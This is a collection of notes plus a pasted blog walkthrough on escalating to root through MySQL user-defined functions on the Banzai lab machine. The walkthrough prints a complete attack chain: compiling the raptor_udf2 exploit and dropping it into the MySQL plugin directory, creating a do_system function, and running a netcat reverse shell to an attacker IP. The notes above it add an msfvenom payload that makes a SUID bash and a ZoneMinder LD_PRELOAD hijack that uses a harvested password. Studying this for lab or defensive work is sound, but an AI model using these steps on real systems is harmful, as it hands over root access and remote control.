
##
#
https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
#
https://r3dbuck3t.notion.site/MySQL-UDF-functions-3542db4a45ba4b7ea9b946098f9f80a3
#
##



```
harvest pass...
 /things/www/webroot/zoneminder/www/api/app/Config/database.php

gen shared object lib...
msfvenom -p linux/x64/exec CMD="cp /bin/bash /var/tmp/bash; chmod u+s /var/tmp/bash;" -f elf-so -o yoyo.so

do the things...
yoyo.so to /var/tmp/yoyo.so
mysql -u zmuser -pROOTPASSWORDLOL -e "use zm;update Config set value='/var/tmp/yoyo.so' where name='ZM_LD_PRELOAD';"

A .so file on Linux is a shared object file, which is a dynamic-link library format used by the Linux operating system and other Unix-like systems.
Shared object files are similar to dynamic link libraries (DLLs) on Windows systems. These files contain compiled code and data that can be used by multiple programs at the same time.
The term "shared" indicates that multiple programs can share the code in memory, reducing redundancy and improving system efficiency.

```

Privilege Escalation with MySQL User Defined Functions
Nairuz Abulhul
R3d Buck3T
Nairuz Abulhul

·




Extending MySQL functionality with UDFs — Banzai, Proving Grounds


https://unsplash.com/photos/qeiyUaSX6fk — Miguel Teirlinck
Functions are a block of queries and statements that take inputs and return values. All popular database systems provide a wide range of built-in functions to perform operations and tasks related to their systems.

Sometimes, there is a need to create custom functions that are not available through the built-in functions to perform specific operations. Relational database systems provide that flexibility and the mechanism to allow users to create their custom functions and run them natively the same way as the built-ins; they are called User Defined Functions (UDF).

UDF functions are language agnostic; they are written in any programming language to be compiled natively into a shared library. Usually, the steps involve writing a library, either a shared object in Linux, or DLL in Windows, putting that library into a system directory, then creating the SQL functions.

These functions can be modified independently, and stored in the database for multiple uses.

From an offensive perspective, that is great news 😈. We can create malicious functions to run commands on the underlying operating system with the same privileges as the running service. If the compromised target runs a SQL server as root, we can run the commands as root as well.

This post will walk through creating a UDF function to escalate privileges on a Linux system that runs MySQL database server as root. The performing steps are on the Banzai machine from Offensive Security — Proving Grounds.

🔥$_Attack_Steps
We have the initial foothold as a low priv user “www-data” user. Through the post-exploitation enumeration, I found there is a MySQL server running locally on port 3306. Looking into the processes list, I found the MySQL process is running as root.


Looking through the config.php file, I found the password for the root user. Before this box, I didn’t know about UDF functions. However, I know that mysql provides a way to execute shell commands directly to the system. So, I started searching for ways to execute commands as root since I have access as one, and I came across the UDF functions and the raptor exploits by Macro Ivaldi that works on MySQL.


UDF exploit
We download the exploit locally with wget command, then transfer the exploit to the target machine to compile it with gcc since it is installed on the machine. Then compile the exploit, and make it a shared library.

📌 It is essential to take into consideration the target machine architecture when compiling the exploit to avoid running into errors later.

gcc -g -c raptor_udf2.c  #compile the exploit code
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc        #create the shared library (so)

compiling an exploit
Next step, we connect to the MySQL database with the retrieved credentials and look around for the location of the plugins directory where MySQL stores its UDF functions. Then, we move the shared library we compiled earlier into that directory.

Authenticating to mysql

mysql -u root -p
Locating the Plugins Path:

show variables like '%plugin%';

searching for the locations of the plugins directory
Also, we need to check if the variable secure_file_priv is enabled to allow data import and export operations like load_file and load_data functions.

If the returned value is null/empty, as in the below screenshot, it means the variable is disabled, and we can load data into the database.

show variables like '%secure_file_priv%';

secure_file_priv is disabled
Now we know where we should store the exploit and have all the needed permissions. Next, we will switch to the mysql database and create the UDF function inside mysql to point to our compiled exploit (shared library).

Switch to mysql database.
use mysql;

Create a table to hold the exploit code.
create table foo(line blob);
Import the exploit by inserting its contents into the table. Provide the directory path of where the exploit was compiled. In our case, it was compiled in the /var/www directory, where the current user “www-data” has writing permissions.
insert into foo values(load_file('/var/www/raptor_udf2.so'));

Next, select the binary contents in the shared library and dump them onto the plugins directory, where UDFS can be stored.
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Lastly, call the exploit by creating a function that invokes it.
create function do_system returns integer soname 'raptor_udf2.so';

Confirm the function is present in mysql.
select * from mysql.func;
We have the “do_system” function created. Great !!!


After creating the UDF function, let’s test it by running an OS command like “id” and redirect its output to a file we can read.

select do_system('id > /var/www/output; chown www-data www-data  /var/www/output');

output file shows the command executed as root
We see that our id id root. Now, we can pass the function a netcat command to get a shell back to our machine.

select do_system('nc 192.168.49.136 8080 -e /bin/bash');

running netcat shell

root user — netcat shell
That’s all for today. Thanks for reading.

All of the used commands can be found at R3d-Buck3T — Notion (Linux — Privilege Escalation via MySQL)

